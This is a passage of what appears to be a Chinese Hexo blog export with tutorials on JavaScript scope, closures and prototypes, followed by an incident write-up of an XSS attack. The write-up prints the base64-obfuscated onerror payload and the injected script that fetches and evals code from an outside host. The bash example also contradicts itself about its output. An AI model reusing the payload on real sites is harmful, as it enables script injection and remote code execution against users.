2</code>的声明。</p>\n<p>下面我们来简单描述一下这段代码的执行过程：</p>\n<ul>\n<li>在全局环境下声明了<code>value变量</code>、<code>foo函数</code>、<code>bar函数</code></li>\n<li>执行<code>bar函数</code>，</li>\n<li>在函数<code>bar</code>内部声明了<code>value变量</code>并赋值为2</li>\n<li>执行，<code>foo函数</code></li>\n<li>在函数内寻找<code>value变量</code>声明，未找到,向上一层作用域继续寻找</li>\n<li>在顶层作用域<code>window</code>下寻找到了<code>value</code>变量，若直到顶层作用域任未找到则报错</li>\n<li>输出结果<code>1</code></li>\n</ul>\n<h3 id=\"动态作用域\"><a href=\"#动态作用域\" class=\"headerlink\" title=\"动态作用域\"></a>动态作用域</h3><p>上面已经描述了词法作用域的工作方式，这里我们来稍微讲讲与<strong>词法作用域</strong>完全对立的<strong>动态作用域</strong></p>\n<p>我们这里就以bash为例：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">value=1</span><br><span class=\"line\">function foo () &#123;</span><br><span class=\"line\">    echo $value;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">function bar () &#123;</span><br><span class=\"line\">    local value=2;</span><br><span class=\"line\">    foo;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">bar // 2</span><br></pre></td></tr></table></figure>\n<p>我们将上面代码保存为<code>scope.bash</code>的文件，通过执行<code>bash scope.bash</code>,最终输出<code>1</code></p>\n<h3 id=\"变量提升\"><a href=\"#变量提升\" class=\"headerlink\" title=\"变量提升\"></a>变量提升</h3><p>在代码执行前，引擎会在执行前编译它。编译过程的一部分就是找到<strong>所有的声明</strong>，并将它们<strong>关联在合适的作用域上</strong></p>\n<p>例如这段代码：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a = 2;</span><br><span class=\"line\"></span><br><span class=\"line\">var a;</span><br><span class=\"line\"></span><br><span class=\"line\">console.log( a );</span><br></pre></td></tr></table></figure>\n<p>当你看到 <code>var a = 2;</code> 时，你可能认为这是一个语句。但是 JavaScript 实际上认为这是两个语句：<code>var a;</code> 和 <code>a = 2;</code></p>\n<ul>\n<li>第一个语句，声明，是在编译阶段被处理的。</li>\n<li>第二个语句，赋值，为了执行阶段而留在 原处。</li>\n</ul>\n<p>于是可以认为代码被处理成这样了：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var a;</span><br><span class=\"line\">a = 2;</span><br><span class=\"line\"></span><br><span class=\"line\">console.log( a );</span><br></pre></td></tr></table></figure>\n<p>关于这种处理的一个有些隐喻的考虑方式是，变量和函数声明被从它们在代码流中出现的位置<strong>“移动”到代码的顶端</strong>。这就产生了<strong>“提升”</strong>这个名字</p>\n<p>需要注意的是：提升是 <strong>以作用域为单位的</strong></p>\n<h4 id=\"函数优先\"><a href=\"#函数优先\" class=\"headerlink\" title=\"函数优先\"></a>函数优先</h4><p>函数声明和变量声明都会被提升。但一个微妙的细节（可以 在拥有多个“重复的”声明的代码中出现）是，<strong>函数会首先被提升</strong>，<strong>然后才是变量</strong>。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">foo(); // 1</span><br><span class=\"line\"></span><br><span class=\"line\">var foo;</span><br><span class=\"line\"></span><br><span class=\"line\">function foo() &#123;</span><br><span class=\"line\">\tconsole.log( 1 );</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">foo = function() &#123;</span><br><span class=\"line\">\tconsole.log( 2 );</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>将会被转变成：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function foo() &#123;</span><br><span class=\"line\">\tconsole.log( 1 );</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">foo(); // 1</span><br><span class=\"line\"></span><br><span class=\"line\">foo = function() &#123;</span><br><span class=\"line\">\tconsole.log( 2 );</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>注意那个 <code>var foo</code> 是一个重复（因此被无视）的声明，即便它出现在 <code>function foo()...</code> 声明之前，因为函数声明是在普通变量之前被提升的。</p>\n<p>虽然<strong>多个/重复的 var</strong>声明实质上是被忽略的，但是后续的函数声明<strong>确实会覆盖前一个</strong>。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function foo() &#123;</span><br><span class=\"line\">    console.log(&apos;a&apos;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">foo();</span><br><span class=\"line\">function foo () &#123;</span><br><span class=\"line\">    console.log(&apos;b&apos;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>实际上转变成了:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function foo () &#123;</span><br><span class=\"line\">    console.log(&apos;b&apos;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">foo();</span><br></pre></td></tr></table></figure>\n<h2 id=\"闭包\"><a href=\"#闭包\" class=\"headerlink\" title=\"闭包\"></a>闭包</h2><p>闭包对于大多数熟练的JavaScript也算是一个模糊不清的概念，什么是闭包呢，闭包能给我们带来什么好处和坏处？</p>\n<p>简单来说可以用一句话概括闭包的特性与作用：<strong>闭包就是函数能够记住并访问它的词法作用域，即使这个函数在它的词法作用域外执行</strong></p>\n<blockquote>\n<p>让我们跳进代码来说明这个定义：</p>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">foo</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> a = <span class=\"number\">2</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">bar</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">console</span>.log( a ); <span class=\"comment\">// 2</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tbar();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">foo();</span><br></pre></td></tr></table></figure>\n<p>上面的代码段被认为是函数 bar() 在函数 foo() 的作用域上有一个 闭包.换一种略有不同的说法是，bar() 闭住了 foo() 的作用域。为什么？因为 bar() 嵌套地出现在 foo() 内部。就这么简单。</p>\n<p>根据文章上面的<code>作用域</code>我们知道，函数的作用域是<strong>编写时定义</strong>的而不是运行时决定的，所以我们通过函数内部返回函数时，返回出来的函数的作用域链的<strong>起始位置</strong>依然是那个函数内部。由于在函数外部对函数内部值存在引用的关系，<strong>垃圾回收机制</strong>并不会将变量回收而是会一直在函数内部引用。</p>\n<h3 id=\"闭包的特性\"><a href=\"#闭包的特性\" class=\"headerlink\" title=\"闭包的特性\"></a>闭包的特性</h3><p>根据闭包的定义我们能很容易记住其两大特点：</p>\n<p>1、能够记住并访问它的词法作用域<br>2、即使在它的作用域外执行</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">foo</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> a = <span class=\"number\">2</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">bar</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">console</span>.log( a );</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> bar;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> baz = foo();</span><br><span class=\"line\"></span><br><span class=\"line\">baz(); <span class=\"comment\">// 2 -- 哇噢，看到闭包了，伙计。</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li><code>bar()</code> 被执行了，必然的。但是在这个例子中，它是在它被声明的词法作用域 外部 被执行的。</li>\n<li><code>foo()</code> 被执行之后，一般说来我们会期望 <code>foo()</code> 的整个内部作用域都将消失，因为我们知道 引擎 启用了 垃圾回收器 在内存不再被使用时来回收它们。因为很显然 <code>foo()</code> 的内容不再被使用了，所以看起来它们很自然地应该被认为是 消失了。</li>\n<li>但是闭包的“魔法”不会让这发生。内部的作用域实际上 依然 “在使用”，因此将不会消失。谁在使用它？函数 <code>bar()</code> 本身。</li>\n<li>有赖于它被声明的位置，<code>bar()</code> 拥有一个词法作用域闭包覆盖着 <code>foo()</code> 的内部作用域，闭包为了能使 <code>bar()</code> 在以后任意的时刻可以引用这个作用域而保持它的存在。</li>\n<li><code>bar()</code> 依然拥有对那个作用域的引用，而这个引用称为闭包。</li>\n</ul>\n<h3 id=\"闭包使用场景\"><a href=\"#闭包使用场景\" class=\"headerlink\" title=\"闭包使用场景\"></a>闭包使用场景</h3><h4 id=\"无处不在的闭包\"><a href=\"#无处不在的闭包\" class=\"headerlink\" title=\"无处不在的闭包\"></a>无处不在的闭包</h4><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">wait</span>(<span class=\"params\">message</span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\tsetTimeout( <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">timer</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">console</span>.log( message );</span><br><span class=\"line\">\t&#125;, <span class=\"number\">1000</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">wait( <span class=\"string\">\"Hello, closure!\"</span> );</span><br></pre></td></tr></table></figure>\n<ul>\n<li>我们拿来一个内部函数（名为 timer）将它传递给 setTimeout(..)。但是 timer 拥有覆盖 wait(..) 的作用域的闭包，实际上保持并使用着对变量 message 的引用。</li>\n<li>在我们执行 wait(..) 一千毫秒之后，要不是内部函数 timer 依然拥有覆盖着 wait() 内部作用域的闭包，它早就会消失了。</li>\n<li>在 引擎 的内脏深处，内建的工具 setTimeout(..) 拥有一些参数的引用，可能称为 fn 或者 func 或者其他诸如此类的东西。引擎 去调用这个函数，它调用我们的内部 timer 函数，而词法作用域依然完好无损。</li>\n</ul>\n<h4 id=\"循环-闭包\"><a href=\"#循环-闭包\" class=\"headerlink\" title=\"循环 + 闭包\"></a>循环 + 闭包</h4><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i=<span class=\"number\">1</span>; i&lt;=<span class=\"number\">5</span>; i++) &#123;</span><br><span class=\"line\">\tsetTimeout( <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">timer</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">console</span>.log( i );</span><br><span class=\"line\">\t&#125;, i*<span class=\"number\">1000</span> );</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这段代码的精神是，我们一般将 期待 它的行为是分别打印数字“1”，“2”，……“5”，一次一个，一秒一个<br>实际上，如果你运行这段代码，你会得到“6”被打印5次，一秒一个。</p>\n<p class=\"tip\">我们试图 暗示 在迭代期间，循环的每次迭代都“捕捉”一份对 i 的拷贝。但是，虽然所有这5个函数在每次循环迭代中分离地定义，由于作用域的工作方式，它们 都闭包在同一个共享的全局作用域上，而它事实上只有一个 i</p>\n\n\n<p>如何解决这个问题呢，定义一个新的作用域，在每次迭代时持有值 i 的一个拷贝。在新的匿名函数内部定义了一个新的局部作用域，i设置为了每次遍历时的值，这样便不会继续往上遍历了。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i=<span class=\"number\">1</span>; i&lt;=<span class=\"number\">5</span>; i++) &#123;</span><br><span class=\"line\">\t(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">j</span>)</span>&#123;</span><br><span class=\"line\">\t\tsetTimeout( <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">timer</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">console</span>.log( j );</span><br><span class=\"line\">\t\t&#125;, j*<span class=\"number\">1000</span> );</span><br><span class=\"line\">\t&#125;)( i );</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","categories":["js"],"tags":["js"]},{"title":"JavaScript系列之原型与原型链","url":"http://zhoushaw.github.io/2019/04/20/learning/font-end/js/JavaScript-prototype/","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>在JavaScript语言中实际上并不存在“类”，那么它是如何实现<strong>继承</strong>、<strong>多态</strong>、<strong>实例化</strong>等特性呢。它采用了与类不同的另一种技术，将其称之为<strong>原型</strong>，并通过<strong>原型链</strong>来实现<strong>继承</strong>、<strong>多态</strong>等特性。</p>\n<p>但是需要注意的是JavaScript的<strong>继承</strong>,与Java的继承实际上有很大的区别，在Java语言中，<strong>继承</strong>是一个<strong>拷贝过程</strong>在物理地址上发生了拷贝，而JavaScript语言是通过<strong>原型链</strong>将其”链接”在一起，没有发生实际的拷贝。</p>\n<div><a id=\"more\"></a></div>\n\n<h2 id=\"构造函数创建对象\"><a href=\"#构造函数创建对象\" class=\"headerlink\" title=\"构造函数创建对象\"></a>构造函数创建对象</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function Person() &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var person = new Person();</span><br><span class=\"line\">person.name = &apos;Kevin&apos;;</span><br><span class=\"line\">console.log(person.name) // Kevin</span><br></pre></td></tr></table></figure>\n<p>在这个例子中，Person 就是一个构造函数，我们使用 new 创建了一个实例对象 person。</p>\n<h2 id=\"原型\"><a href=\"#原型\" class=\"headerlink\" title=\"原型\"></a>原型</h2><h3 id=\"prototype\"><a href=\"#prototype\" class=\"headerlink\" title=\"prototype\"></a>prototype</h3><p>什么是原型呢？可以这样理解：每一个JavaScript对象(null除外)在创建的时候就会与之<strong>关联</strong>另一个对象，这个对象就是我们所说的<strong>原型</strong>，每一个对象都会从<strong>原型</strong>“<strong>继承</strong>“属性。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function Person() &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">// 虽然写在注释里，但是你要注意：</span><br><span class=\"line\">// prototype是函数才会有的属性</span><br><span class=\"line\">Person.prototype.name = &apos;Kevin&apos;;</span><br><span class=\"line\">var person1 = new Person();</span><br><span class=\"line\">var person2 = new Person();</span><br><span class=\"line\">console.log(person1.name) // Kevin</span><br><span class=\"line\">console.log(person2.name) // Kevin</span><br></pre></td></tr></table></figure>\n<p>这个函数的 prototype 属性到底指向的是什么呢？是这个函数的原型吗？</p>\n<blockquote>\n<p>上面例子中的解释：</p>\n</blockquote>\n<ul>\n<li><code>Person</code>为构造函数</li>\n<li><code>person1</code>、<code>person2</code>为<code>Person</code>的实例</li>\n<li>构造函数的<code>prototype</code>属性指向，调用该构造函数而创建的实例的<strong>原型</strong></li>\n<li><code>Person.prototype</code>为<code>person1</code>的<strong>原型</strong></li>\n<li><code>person1</code>、<code>person2</code>继承了原型中的<code>name</code>属性</li>\n</ul>\n<p>用一张图解释<strong>构造函数</strong>与<strong>实例原型</strong>的关系</p>\n<p><img src=\"https://s10.mogucdn.com/mlcdn/c45406/190421_21bijk293k7244lgcie0j4fgbe5g2_1058x578.png\" alt=\"\"></p>\n<h3 id=\"proto\"><a href=\"#proto\" class=\"headerlink\" title=\"proto\"></a><strong>proto</strong></h3><p>在上面的<strong>prototype</strong>中我们详细描述了<strong>构造函数</strong>如何与实例原型联系起来，那<strong>实例</strong>如何与<strong>实例原型</strong>之间如何联系呢？</p>\n<p>在标准浏览器中构造函数的<strong>实例</strong>都拥有一个<code>__proto__</code>属性，通过这个<strong>实例</strong>上的<strong>属性</strong>可以找到这个实例的原型</p>\n<p><img src=\"https://s10.mogucdn.com/mlcdn/c45406/190421_1235011ggh2af3b01hj7941010l4l_990x668.png\" alt=\"\"></p>\n<h3 id=\"constructor-NaN\"><a href=\"#constructor-NaN\" class=\"headerlink\" title=\"constructor\"></a>constructor</h3><p>每个原型都有一个 <strong>constructor</strong> 属性指向关联的构造函数</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function Person() &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">console.log(Person === Person.prototype.constructor); // true</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://s10.mogucdn.com/mlcdn/c45406/190421_1345h0c13a027556c48j45lj2ib2e_1104x556.png\" alt=\"\"></p>\n<p>综上我们已经得出：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function Person() &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">var person = new Person();</span><br><span class=\"line\"></span><br><span class=\"line\">console.log(person.__proto__ == Person.prototype) // true</span><br><span class=\"line\">console.log(Person.prototype.constructor == Person) // true</span><br><span class=\"line\">// 顺便学习一个ES5的方法,可以获得对象的原型</span><br><span class=\"line\">console.log(Object.getPrototypeOf(person) === Person.prototype) // true</span><br></pre></td></tr></table></figure>\n<p>并且我们得出了：<code>构造函数</code>、<code>原型</code>、<code>实例</code>之间的关系</p>\n<p><img src=\"https://s10.mogucdn.com/mlcdn/c45406/190421_7b4h6c755ckcg3ig1719c71jjdlcc_1244x990.png\" alt=\"\"></p>\n<h2 id=\"实例与原型\"><a href=\"#实例与原型\" class=\"headerlink\" title=\"实例与原型\"></a>实例与原型</h2><p>当我们读取<strong>对象</strong>属性时，若我们读取的对象不存在，将会自动到对象的<strong>原型</strong>上查找属性是否存在，如果属性不存在将会到<strong>原型的原型</strong>上查找，一直会找到null为止</p>\n<p>通过🌰我们来进行说明：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function Person() &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Person.prototype.name = &apos;Kevin&apos;;</span><br><span class=\"line\"></span><br><span class=\"line\">var person = new Person();</span><br><span class=\"line\"></span><br><span class=\"line\">person.name = &apos;Daisy&apos;;</span><br><span class=\"line\">console.log(person.name) // Daisy</span><br><span class=\"line\"></span><br><span class=\"line\">delete person.name;</span><br><span class=\"line\">console.log(person.name) // Kevin</span><br></pre></td></tr></table></figure>\n<p>第一次log输出时我们得到了预期输出<code>Daisy</code>,随后我们通过<code>delete</code>关键词删除了person实例上的<code>name</code>属性，第二次输出是通过查询发现person实例中并不存在属性<code>name</code>，到<code>person</code>实例的原型<code>Person.prototype</code>上进行查找找到<code>name</code>属性，查询终止。</p>\n<p>若<code>Person.prototype</code>上任然不存在<code>name</code>属性呢，将会从何处进行查询?</p>\n<h2 id=\"原型的原型\"><a href=\"#原型的原型\" class=\"headerlink\" title=\"原型的原型\"></a>原型的原型</h2><p>从<code>实例</code>与<code>实例原型</code>的关系里面可以知道，通过<code>__proto__</code>属性我们可以查询到期原型，那么原型的原型是什么呢?</p>\n<p>通过这个🌰我们可以很清晰的知道，构造函数的原型的原型是<code>Object.prototype</code>,<code>Object.prototype</code>的原型是<code>null</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function Person()&#123;&#125;</span><br><span class=\"line\">Person.prototype.__proto__ === Object.prototype // true</span><br><span class=\"line\">Object.prototype.__proto__ === null // true</span><br></pre></td></tr></table></figure>\n<p>通过上述的知识点我们可以构建成一幅完整的关系：</p>\n<p><img src=\"https://s10.mogucdn.com/mlcdn/c45406/190421_7cebll7hhc7ea3jfe102f2g4fj4fa_836x772.png\" alt=\"\"></p>\n<p>其中<strong>青色</strong><code>__proto__</code>的线路就是我们通常所说的原型链</p>\n<h2 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h2><ul>\n<li><a href=\"https://github.com/getify/You-Dont-Know-JS/blob/1ed-zh-CN/this%20%26%20object%20prototypes/ch5.md\" target=\"_blank\" rel=\"noopener\">you don’t know js: this &amp; prototype</a></li>\n<li><a href=\"https://github.com/mqyqingfeng/Blog/issues/2\" target=\"_blank\" rel=\"noopener\">JavaScript深入之从原型到原型链</a></li>\n</ul>\n","categories":["js"],"tags":["js"]},{"title":"前端安全与防范","url":"http://zhoushaw.github.io/2019/04/16/learning/font-end/security/前端安全与防范/","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>今天主站遭受了xss攻击，起因是一个普通用户发表了一个穿搭，后端接收到异常警报排查后发现用户的穿搭的<strong>描述</strong>中带有:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;p&gt;&lt;body/hidden&gt;&lt;img src=x onerror=document[&apos;write&apos;](atob(&apos;PGJvZHkvaGlkZGVuPjxzY3JpcHQgc3JjPWh0dHBzOi8vczUubW9ndWNkbi5jb20vbWxjZG4vYzQ1NDA2LzE5MDQxNV82M2o2NWxlazRkMjJnODZjNWhiN2thOThsOWZmZT48L3NjcmlwdD4=&apos;))&gt;&lt;/p&gt;</span><br></pre></td></tr></table></figure>\n<p>因为穿搭look中带有格式化后html的描述内容，所以直接通过<strong>v-html</strong>指令输出了描述内容：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;div v-if=&quot;from === &apos;detail&apos;&quot; v-html=&quot;content&quot; ref=&quot;content&quot; style=&quot;-webkit-user-select: text&quot;&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure>\n<p>这个时候攻击的html标签将会直接被注入到页面中，这里还涉及到另外一个知识点：</p>\n<ul>\n<li>btoa（base64加密）</li>\n<li>atob （base64解密）</li>\n</ul>\n<div><a id=\"more\"></a></div>\n\n<p>经过<code>atob</code>解密后：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">atob(&apos;PGJvZHkvaGlkZGVuPjxzY3JpcHQgc3JjPWh0dHBzOi8vczUubW9ndWNkbi5jb20vbWxjZG4vYzQ1NDA2LzE5MDQxNV82M2o2NWxlazRkMjJnODZjNWhiN2thOThsOWZmZT48L3NjcmlwdD4=&apos;)</span><br><span class=\"line\"></span><br><span class=\"line\">// 转变成</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;body/hidden&gt;&lt;script src=https://s5.mogucdn.com/mlcdn/c45406/190415_63j65lek4d22g86c5hb7ka98l9ffe&gt;&lt;/script&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">// 一般攻击者都不会将，body隐藏。而是直接通过盗用信息</span><br></pre></td></tr></table></figure>\n<p>通过<code>document[&#39;write&#39;]</code>将dom写入页面后，通过<code>mogucdn</code>资源将会下载脚本：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var ua = navigator.userAgent.toLowerCase();</span><br><span class=\"line\"></span><br><span class=\"line\">// 在微信环境下，将会通过ajax请求获取站外脚本，获取完成后通过eval动态执行</span><br><span class=\"line\">if (/micromessenger/.test(ua)) &#123;</span><br><span class=\"line\">    $.get(&apos;https://api.ruanwin.com/j&apos;,function(d) &#123;</span><br><span class=\"line\">        window[&apos;ev&apos; + &apos;al&apos;](d);</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>所幸精选穿搭必须由产品手动审核，该look并不会进入首页，否则至少将造成P1级故障</strong></p>\n<h2 id=\"安全于防范\"><a href=\"#安全于防范\" class=\"headerlink\" title=\"安全于防范\"></a>安全于防范</h2><blockquote>\n<p>常见攻击手段</p>\n</blockquote>\n<ul>\n<li><p>XSS</p>\n<ul>\n<li>跨站脚本（Cross-site 